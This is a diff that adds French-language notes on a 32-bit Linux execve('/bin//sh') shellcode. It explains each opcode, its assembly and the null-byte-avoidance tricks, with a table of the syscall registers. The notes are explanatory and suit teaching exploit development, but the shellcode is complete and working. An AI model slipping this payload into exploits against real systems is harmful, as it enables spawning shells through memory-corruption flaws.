@@ -1,0 +1,20 @@
+For 32‑bit Linux:
+
+Register	Meaning
+
+EAX	        syscall number
+EBX	        arg1
+ECX	        arg2
+EDX	        arg3
+
+
+Hexadécimal 	Instruction         Assembleur	 Explication
+6a 0b	          push 0xb	            Place la valeur 11 (0xb) sur la pile.
+58	              pop eax	            Récupère 11 dans le registre EAX. C'est le numéro de l'appel système execve sous Linux x86.
+99	              cdq	                Étend le signe de EAX dans EDX. Comme EAX est positif, cela met EDX à 0. Pratique pour éviter les octets nuls (00) dans le code.
+52	              push  edx	            Pousse le 0 sur la pile (sert de délimiteur de fin de chaîne \0).
+68 2f 2f 73 68	  push 0x68732f2f	    Pousse //sh sur la pile.
+68 2f 62 69 6e    push 0x6e69622f	    Pousse /bin sur la pile.
+89 e3	          mov ebx, esp	        Copie l'adresse du haut de la pile (qui pointe maintenant vers /bin//sh\0) dans EBX. C'est le 1er argument de execve.
+31 c9	          xor ecx, ecx	        Met ECX à 0. C'est le 2e argument (tableau d'arguments argv, ici nul).
+cd 80	          int 0x80	            Déclenche l'interruption logicielle pour exécuter l'appel système.
